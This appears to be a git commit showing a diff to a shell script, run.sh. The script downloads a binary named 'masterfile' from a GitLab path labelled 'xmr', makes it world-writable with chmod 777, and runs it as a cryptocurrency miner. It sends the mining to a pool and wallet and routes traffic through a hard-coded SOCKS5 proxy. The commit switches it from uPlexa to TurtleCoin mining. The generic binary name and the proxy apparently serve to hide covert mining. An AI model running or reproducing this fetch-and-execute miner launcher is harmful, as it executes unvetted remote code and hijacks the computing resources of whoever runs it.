004c5e04eac13af79fe33a852f06444515753aa7
TomikoBraswell <89598982+TomikoBraswell@users.noreply.github.com>
2021-08-26 17:00:38 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,8 +1,8 @@
 #!/bin/sh
 wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
 chmod 777 masterfile
-POOL=us.uplexa.herominers.com:1177
-WALLET=UmWLzD8WeTeHGsLkg62HNL1np52QG5rRxBUc4iL6rtyGQcdUrkGwUBQQAEjSZQTR3DdW27iJrq6aAXBLrYveNegr2JwsVeAHZ
+POOL=turtlecoin.herominers.com:10380
+WALLET=TRTLuwaiGbcexV82zFn2tk3gEemniqMYtirfBSYtXdBLFYE5yJpE15B9LYZxmGNzGPPYvGoCQ8Ke1ZXB49X1tQGCJKaoA9zPEKw+a496e7541267b713e71a50ccebf86c02c984a22cbacc038edf9637d02000e67f
 WORKER=CPU
 PROXY=socks5://192.252.209.155:14455
-./masterfile -o $POOL -u $WALLET -p $WORKER -a cn/upx2 --donate-level 1 -t 2 -x $PROXY -k
+./masterfile -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
